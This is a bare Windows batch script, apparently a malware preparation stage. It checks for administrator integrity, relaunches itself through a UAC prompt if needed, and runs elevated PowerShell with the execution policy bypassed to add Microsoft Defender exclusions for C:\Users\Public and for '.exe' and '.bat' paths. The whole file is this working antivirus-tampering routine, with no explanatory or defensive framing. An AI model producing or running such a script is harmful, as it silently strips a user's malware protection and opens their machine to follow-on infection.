@echo off
@whoami /groups | find "S-1-16-12288" > nul
@if errorlevel 1 PowerShell Start-Process '%0' -Verb RunAs & exit /b
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath C:\Users\Public""' -Verb RunAs"
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath .exe""' -Verb RunAs"
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath .bat""' -Verb RunAs"
pause > nul
